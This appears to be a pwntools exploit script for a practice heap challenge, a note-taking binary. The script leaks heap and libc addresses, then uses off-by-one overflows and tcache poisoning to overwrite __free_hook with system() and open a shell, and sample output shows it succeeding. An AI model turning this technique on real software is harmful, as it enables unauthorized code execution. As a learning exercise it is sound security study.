#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./yanc')
context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def add_note(note, title):
	# Max 19 notes / 255 chars per note
	# Note: malloc, rdi: 0x3e
	io.sendline(b'1')
	io.recvuntil(' : ')
	io.sendline(note)
	io.recvuntil(' : ')
	io.sendline(title)
	io.recvuntil('quit\n')

def del_note(which):
	io.sendline(b'2')
	io.recvuntil(' : ')
	io.sendline(which)
	io.recvuntil('quit\n')

def view_notes():
	io.sendline(b'3')
	return io.recvuntil('quit\n')

def quit():
	io.sendline(b'4')

io = start()
io.recvuntil('quit\n')

# Leaking heap address:

add_note(b'a', b'b')
add_note(b'c', b'd')
add_note(b'e', b'f')

del_note(b'1')
add_note(b'g', 'X'*32+"A")

io.recvuntil('quit\n')

leak = view_notes()[0x44:0x44+6]
leak_int = int.from_bytes(leak, "little")
print('[*] Heap leak: {}'.format(hex(leak_int)))

# Creating unsorted_bin (After tcache is filled, the free memory 
# is placed in fastbin or unsorted bin as before.)

for x in range(9):
	add_note(b'a'*0x90, b'x')

for x in range(3, 8+3):
	del_note(str(x))

# leak_int + 0x4df = address of unsorted bin
# unsorted bin contains 2 pointers to libc
# e.i: 0x0000556a8bd8c720 + p64(0x0) 7c a2 8c cc 7f 00 00 a0 7c a2 8c cc 7f 00 00

add_note(b'libc_leak', p64(leak_int+0x4ff)) # test:

address_unsortedbin_int = int.from_bytes(view_notes()[0x70+6:0x80-4], "little")

print("[*] Address unsortedbin: " + hex(address_unsortedbin_int))

add_note(b'aaaa', b'dupa123')
add_note(b'aaaa', b'aaaa')
del_note(b'4')

# Overflow one byte - to point at libc from unsortedbin pointer to libc
add_note(b'aaaa', b'YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\x80')

io.recvuntil('quit\n')

address_leaklibc_int = int.from_bytes(view_notes()[0xbf:0xc5], "little")
print("[*] Leak libc: " + hex(address_leaklibc_int))
print("[*] Libc base: " + hex(address_leaklibc_int-0x3ebca0)) # libc base? 0x3ebca0

libc_system = address_leaklibc_int-0x3ebca0+0x4f440
print("[*] Libc system: " + hex(libc_system)) # libc base? 0x3ebca0

free_hook = address_leaklibc_int-0x3ebca0+0x3ed8e8
print("[*] Libc __free_hook: " + hex(free_hook)) # libc base? 0x3ebca0

###### 07.04.2020 21:45

# Freeing 3 tcachebins + 1 unsortedbin
add_note(b'Q'*0x30, b'test456')
add_note(b'Q'*0x90, b'test456')
add_note(b'Q'*0x90, b'test456')
add_note(b'Q'*0x90, b'test456')

# Take a one chunk - size 0x30
add_note(b'A'*0x20, b'textX')
del_note(b'10')

add_note(b'A'*0x30, b'textY')
del_note(b'10')

payload = p64(0x70) + p64(0x70) + p64(0x55a595700890) + b'\x00'*0x8
add_note(payload, b'testX1')

# Overwrite address at  0x..70
add_note(b'nowy1', b'NOWY1') #12?
add_note(b'nowy2', b'NOWY2') #13?
del_note(b'12')
add_note(b'n', b'A'*32+b'\x70') # offby one 0x70 (testX+16)

del_note(b'13') # freeing 70 -> House of Spirit
del_note(b'10') # freeing 60

#Tcache chunk poisoning (forward pointer poisoning) # 0x60...

# Forward pointer -> C
# add_note(b'A'*8 + b'B'*8 + b'C'*8 + b'D'*8, b'aaa')
add_note(b'A'*8 + b'B'*8 + p64(free_hook) + b'D'*8, b'aaa')

# raw_input('Malloc to our poisoned 0x4141414141414141')
add_note(b'B'*0x60, b'aaa')

# raw_input('Segfault....') # Injection to _free_hook by libc_system
add_note(p64(libc_system) + b'E'*(0x60-0x8), b'bbb') # Segfault

add_note(b'/bin/sh', 'aaa')

io.sendline(b'2')
io.sendline(b'15')

io.interactive()

'''
$ python3 exploit.py
[*] '/mnt/hgfs/LEARN/pwn/onecall/yanc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/mnt/hgfs/LEARN/pwn/onecall/yanc': pid 124080
[*] Heap leak: 0x55e655e8d241
[*] Address unsortedbin: 0x55e655e8d740
[*] Leak libc: 0x7fe9f407dca0
[*] Libc base: 0x7fe9f3c92000
[*] Libc system: 0x7fe9f3ce1440
[*] Libc __free_hook: 0x7fe9f407f8e8
[*] Switching to interactive mode
Which one : $ id
uid=1000(junior) gid=1000(junior) groups=1000(junior),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
$
'''